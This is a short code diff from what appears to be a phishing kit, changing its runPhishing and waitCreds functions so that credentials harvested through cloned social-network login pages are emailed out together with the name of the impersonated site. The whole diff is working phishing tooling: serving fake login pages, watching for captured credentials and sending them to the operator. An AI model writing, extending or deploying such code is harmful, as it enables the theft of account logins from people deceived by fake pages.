@@ -17,6 +17,8 @@ from subprocess import getoutput
 from core.email import send_mail
 
 def runPhishing(social, custom):
+    global _social
+    _social = social
     system('rm -Rf base/Server/www/*.* && touch base/Server/www/cat.txt')   
     command = 'cp base/WebPages/%s/*.* base/Server/www/' % social.lower()
     system(command)
@@ -36,7 +38,7 @@ def waitCreds():
             print(green('\n [*] Credentials found:\n %s' % lines))
             system('rm -rf base/Server/www/cat.txt && touch base/Server/www/cat.txt')
             try:
-                send_mail(lines.split('\n'))       
+                send_mail(lines.split('\n'),_social)       
             except NameError:
                 pass                
 
